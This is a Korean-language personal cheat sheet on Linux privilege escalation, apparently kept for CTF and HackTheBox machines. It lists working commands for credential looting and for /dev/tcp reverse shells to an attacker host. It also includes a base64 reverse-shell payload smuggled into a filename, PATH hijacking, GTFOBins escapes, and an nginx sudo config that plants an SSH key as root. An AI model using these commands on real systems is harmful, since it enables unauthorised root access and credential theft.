---
slug: "linux-privesc"
title: "linux_privesc"
date: 2026-07-21
category: "미분류"
tags: []
excerpt: "쉘 진입하면 privesc 전에 이 3군데부터 훑는다:"
readingTime: 17
---

## Looting (쉘 잡으면 크리덴셜 먼저 줍기)

쉘 진입하면 privesc 전에 이 3군데부터 훑는다:

1. **config credential** ⭐ 제일 중요
   - 중요 시스템(웹앱 등)의 conf 파일 위치부터 찾기
   - 이름에 config 들어간 파일 다 뒤지기
   - ex) [[editor]] → `/etc/xwiki/hibernate.cfg.xml`에서 DB 비번 발견
   - `grep -riE "password|secret|token" /etc /var/www 2>/dev/null`

2. **bash_history**
   - `cat ~/.bash_history` / `cat /home/*/.bash_history`
   - 이전 유저가 명령어에 비번 박아둔 거 찾기

3. **env variable**
   - `env` /  `cat /proc/self/environ | tr '\0' '\n'`

4. **권한상승 후 행동**
	- 웹쉘 따도 `/home/유저` 접근 되면 거기서 추가 권한상승 벡터 탐색
	- SSH 개인키 있으면 읽어서 안정적인 쉘로 전환  **참고**:[[updown]]
 
---
- 아래부턴 사실상 root_privesc
---
## 항상 먼저 확인

정 잘 모르겠으면 https://medium.com/@muchiemma/linux-privilege-escalation-3fb61a09f7ba
이걸 보고 생각 정리를 한번 하려므나

**웹쉘로 접속했을때**
~~~shell
#어떤 내부포트 열려있는지 확인 가능
netstat -tnlp

#각 포트에 대한 조사 ㄱㄱ
~~~
- 홈디렉토리 숨김파일 전체 조사 (가끔 크레덴셜 박혀 있을 때 있음)
	-> /etc/passwd 유저 목록이랑 대조해서 패스워드 스프레이


**sudo 권한 확인**
~~~bash
sudo -l
~~~
- 비밀번호 없이 실행 가능한 스크립트 발견 시 소스코드 분석
- 입력값이 exec()이나 system()에 들어가는지 확인
- 나온 바이너리 `strings {바이너리}` 로 `*` 와일드 카드 사용하는지 분석

**gtfobins**
`sudo -l`에서 나온 녀석은 항상 gtfobins 체크하고 들어가
# https://gtfobins.linuxsec.org/
여기서 확인 한번 해보고 들어가면 좋을듯 ㅇㅇ

**suid 바이너리 확인**
~~~shell
find / -user root -perm -4000 -ls 2>/dev/null
~~~
 **https://morgan-bin-bash.gitbook.io/linux-privilege-escalation**
 -> 찾는다면 여길 들여다봐

만약 없다면 [[linux_privesc#PATH Hijacking]]

**프로세스 / 네트워크 확인**
```bash
# 내부 포트 확인 (외부에서 안 보이는 서비스 발견용)
netstat -tnlp

# 실행 중인 프로세스 확인 (root로 뭐가 돌고 있는지)
ps aux
ps auxww  # 긴 명령어도 잘림 없이 출력
```
- 내부 포트 발견 시 → 각 포트 서비스 조사 (curl localhost:{port})
- root 소유 프로세스 발견 시 → 해당 바이너리/스크립트 소스 분석
- nginx 돌고 있으면 → `/etc/nginx/sites-available` 에서 vhost 확인


**커널 버전 확인**
```shell
#해당 버전 cve 확인
uname -a
```
-> 보통 커널 관련 익스플로잇은 c로 돼 있음 박스로 보낼 때는 
~~~shell
which gcc clang cc tcc g++
~~~
-> 위와 같이 입력 후 gcc가 있는지 확인하고 kali에 익스플로잇을 작성후에 user로 보내서 컴파일 한 후에 사용 gcc는 타겟 안에서 컴파일 해야함

->만약에 진짜 진짜 없다면 칼리에서 
~~~sh
gcc -static {c파일} -o {파일 이름}

#kali
python3 -m http.server 8000
wget http://{ip}/{file_name}
~~~


**DB 크레덴셜 확인**
-> DB 크레덴셜 → 시스템 유저
- conf.php, config.php, .env 등 확인
- DB 크리덴셜 → SSH 재사용 시도
 참고 : [[_BoardLight]]


**exploit이 존재 한다면**
```shell
#kali
python3 -m http.server 8000

#user
wget http://{ip}:{port}/{filename}
chmod +x {filename}
```


**만약 파일 읽기만 가능하다면!**
~~~sh
/root/.ssh/id_rsa 열로 들어가서

ssh -i {rsa 파일} root@{IP}
~~~

---
# 이하는 세부 항목들

---
## SUID 바이너리 탐색

**`SUID` = 이 파일 실행하면 파일 소유자 권한으로 실행**
-> 이걸 찾기 위한 쉘임
```bash
find / -user root -perm -4000 -ls 2>/dev/null
```
 **https://morgan-bin-bash.gitbook.io/linux-privilege-escalation
 -> 찾는다면 여길 들여다봐

```bash
# 절대경로 없이 호출하는 명령어 확인 방법
# 1. 실행 결과 섹션 제목으로 역추론
# 2. ltrace {바이너리} 로 시스템 콜 확인

# 가짜 바이너리 생성 (shebang 필수 - 확장자 없는 파일은 인터프리터 명시해야 함)
echo '#!/bin/bash' > /tmp/{명령어}
echo '/bin/bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1' >> /tmp/{명령어}
chmod +x /tmp/{명령어}

# PATH 앞에 /tmp 추가 (맨 앞이어야 진짜 바이너리보다 먼저 탐색됨)
export PATH=/tmp:$PATH

# SUID 바이너리(컴파일된 실행파일) 실행
{바이너리}
```

**TTY 없을 때**
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
# su, sudo, ssh 같은 명령어는 TTY 필요 → 웹쉘(리버스 쉘로 들어갔더라도)에서 터미널 바로 못 쓰게 막아놨을 수 있음

#파이썬이 없는 경우도 있음
script -qc bash /dev/null
```

**DB 크레덴셜 → 시스템 계정 재사용**

접속 가능하다면 접속해서 테이블들도 조회!!!
```bash
# mysql 없을 때 mysqldump로 덤프
mysqldump --user={user} --password={pass} --host=localhost {dbname}
# → INSERT INTO 에서 크레덴셜 확인 후 su/ssh 시도
```

### 참고
- [[Magic]]: /bin/sysinfo SUID → PATH Hijacking(fdisk) → root
- [[linux_privesc#doas 권한 상승]] -> doas 나오면 써먹으셈

---
## crontab 확인
~~~bash
cat /etc/crontab
ls -al /etc/cron*
cat /var/spool/cron/crontabs/*
~~~

**유저 목록 (쉘 있는 애들만)**
~~~bash
cat /etc/passwd | grep -E "bash|sh$"
~~~

**Crontab + Command Injection**
crontab에서 특정 스크립트가 주기적으로 실행되면서 파일명이나 입력값을 exec()에 그대로 삽입할 때, 파일명에 페이로드 삽입 (-- 로 옵션 끝 선언)
~~~bash
#base64는 
touch -- ';echo {BASE64} | base64 -d | bash'
~~~
touch -- ";echo 'YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yOC80NDQ0IDA+JjEK' | base64 -d | bash #"

### 참고
- [[Networked]]: crontab(*/3) + exec() 파일명 인젝션 → guly
---
## CentOS network-scripts ifcfg 취약점
sudo로 changename.sh 같은 network 관련 스크립트 실행 가능할 때 NAME 입력값에 공백 뒤 명령어가 실행되는 버그

~~~bash
sudo /usr/local/sbin/changename.sh

#이런식으로
interface NAME: good /bin/bash
~~~

### 참고
- [[Networked]]: sudo changename.sh + ifcfg 공백 취약점(centOS) → root
- 버그 문의된 사이트 : https://bugzilla.redhat.com/show_bug.cgi?id=1697473

---
## Docker 크레덴셜 추출
~~~shell
# 실행 중인 컨테이너 확인
docker-ps
# 컨테이너 설정 덤프 (Env에 평문 크레덴셜 자주 노출)
docker-inspect '{{json .Config}}' {container}

# Docker 안에서 돌아가는 MySQL 접속 시 호스트 명시 필수
mysql -h 127.0.0.1 -u {user} -p'{password}'
~~~
### 참고
- [[Busqueda]] 
---
## GTFOBins
sudo 권한으로 실행된 프로세스 안에서 쉘 탈출하는 거.
**조건**: systemd < 247 (**CVE-2023-26604**)

- **less** → `!sh`
- **vim** → `:!sh` 또는 `:shell`
- **find** → `find . -exec /bin/sh \; -quit`
- **awk** → `awk 'BEGIN {system("/bin/sh")}'`

본래 파일 탐색/편집 도구인데 **내부적으로 명령어 실행 기능**을 가지고 있어서, sudo로 실행되면 root 쉘로 탈출 가능!

`sudo -l` 에서 이런 바이너리 보이면 바로 [https://gtfobins.github.io](https://gtfobins.github.io) 검색

**ssh sudo 권한상승**
~~~shell
sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x`
~~~

### 참고
- [[sau]]: systemctl status {filename}.service (**CVE-2023-26604**)
- https://gtfobins.linuxsec.org/     -> **얘를 반드시 보도록 해**
- [[CozyHosting]] : ssh proxyCommand
---
## 상대경로 하이재킹 (PATH Hijacking)
조건: sudo로 실행되는 스크립트가 상대경로로 다른 스크립트를 호출할 때

**탐색 방법**
```bash
# sudo 권한 확인
sudo -l
# 소스코드에서 상대경로 호출 확인 (Gitea, .git 등에서 소스 열람)
# subprocess.call('./full-checkup.sh') 같은 패턴 찾기
```

**익스플로잇**
```bash
# 현재 디렉토리에 악성 스크립트 생성
cd /tmp
echo '#!/bin/bash' > {스크립트명}.sh
echo '/bin/bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1' >> {스크립트명}.sh
chmod +x {스크립트명}.sh

# sudo로 상위 스크립트 실행 → 현재 디렉토리 기준으로 악성 스크립트 호출됨
sudo {상위스크립트}
```

### 참고
* [[Busqueda]]: system-checkup.py full-checkup → ./full-checkup.sh 상대경로 호출 → /tmp에서 실행 → root
---
### doas 권한 상승

doas = sudo 경량 버전. `/usr/local/etc/doas.conf` 확인

```bash
cat /usr/local/etc/doas.conf
# permit nopass player as root cmd /usr/bin/dstat
```
허용된 명령어가 플러그인/설정파일을 외부 경로에서 로드하면 인젝션 가능

**dstat 플러그인 인젝션**
```bash
# 플러그인 로드 경로 확인 (쓰기 권한 있는 곳 찾기)
find / -type d -name dstat 2>/dev/null
# /usr/local/share/dstat 이 쓰기 가능한 경우

# 악성 플러그인 작성 (파일명: dstat_{이름}.py)
echo "import os;os.system('chmod +s /usr/bin/bash')" > /usr/local/share/dstat/dstat_exploit.py

# 플러그인 인식 확인
dstat --list | grep exploit

# doas로 root 권한 실행
doas /usr/bin/dstat --exploit
# 에러 떠도 코드는 실행된 상태

# SUID bash로 root 쉘
bash -p
```
**핵심 원리**: doas로 허용된 명령어 = 안전하다고 착각하기 쉬운데, 그 명령어가 사용자 쓰기 가능 경로에서 플러그인 로드하면 터짐
#### 참고
- [[_soccer]]: doas + dstat plugin injection → SUID bash → root

---
## PATH Hijacking
1. **SUID 바이너리 찾기**
```sh
find / -user root -perm -4000 -ls 2>/dev/null
```

**2. ltrace로 상대경로 명령어 확인**
```sh
ltrace /usr/bin/타겟바이너리
```
**ltrace:** 라이브러리 함수 호출을 추적
 -> system("tar cf ...") 같이 절대경로 없으면 hijacking 가능

3. **페이로드 작성**
```sh
printf '#!/bin/bash\n/bin/bash -p\n' > /tmp/명령어이름
chmod +x /tmp/명령어이름
export PATH=/tmp:$PATH
```

4. **실행**
```sh
/usr/bin/타겟바이너리
```
**!! 웹쉘에서 안되면 SSH로 전환 후 시도**
**mpm-itk 모듈 있는 Apache는 seccomp으로 SUID 제한함**

#### 참고
- [[pandora]]
- [[usage]] : 7za 와일드카드 + @listfile 트릭
---
# SSH 업그레이드
## 리버스쉘 → SSH 업그레이드
```sh
# 웹쉘에서 실행 (타겟)
mkdir -p ~/.ssh
echo "ssh-ed25519 공개키..." > ~/.ssh/authorized_keys

# 칼리에서
ssh -i ~/.ssh/id_ed25519 유저@IP
```

---
## **Python2 input() 취약점**

- Python2의 `input()`은 내부적으로 `eval()` 호출
```python
  __builtins__.__dict__['__import__']("os").system("명령어")
```
를 입력하면서 코드 실행 가능

**참고 :** [[updown]]

---
## **easy_install GTFOBIN**

```sh
TF=$(mktemp -d)
echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
sudo easy_install $TF
```
 
**참고:** 
- gtfobins
- [[updown]]

---
# nginx
nginx sudo privesc
```sh
cat << EOF > /tmp/nginx_pwn.conf
user root;
worker_processes 4;
pid /tmp/nginx.pid;
events {
        worker_connections 768;
}
http {
	server {
	        listen 1339;
	        root /;
	        autoindex on;
	        dav_methods PUT;
	}
}
EOF
```
```sh
sudo nginx -c /tmp/nginx_pwn.conf
```
-> 이러면 1339 포트 열림 원하는 포트 선택 가능 (listen 수정으로)
플래그 열람은 다 되는데 우린 쉘을 따야되니까

```sh
#kali에서 내 pub키 조회
cat ~/.ssh/id_ed25519.pub

#그리고 내 pub키를 /tmp에 저장후 
curl -X PUT localhost:1339/root/.ssh/authorized_keys -d "$(cat /tmp/id_rsa.pub)"

#다시 kali에서
ssh root@10.129.9.192
cat root.txt
```

**참고**
- [exploit](https://github.com/DylanGrl/nginx_sudo_privesc/blob/main/exploit.sh)
- [[Broker#Privilege Escalation]]
---
